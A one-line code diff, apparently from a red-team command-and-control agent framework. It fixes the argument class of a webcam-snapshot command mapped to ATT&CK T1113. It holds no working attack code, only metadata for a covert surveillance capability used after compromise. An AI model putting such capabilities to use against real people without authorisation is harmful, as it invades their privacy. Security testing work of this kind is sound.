@@ -22,7 +22,7 @@ class WebcamSnapCommand(CommandBase):
     description = "Take a webcam snap of the computer."
     version = 2
     author = "@reznok, @djhohnstein"
-    argument_class = ScreenshotArguments
+    argument_class = WebcamSnapArguments
     browser_script = BrowserScript(script_name="webcamsnap", author="@djhohnstein", for_new_ui=True)
     attackmapping = ["T1113"]
 
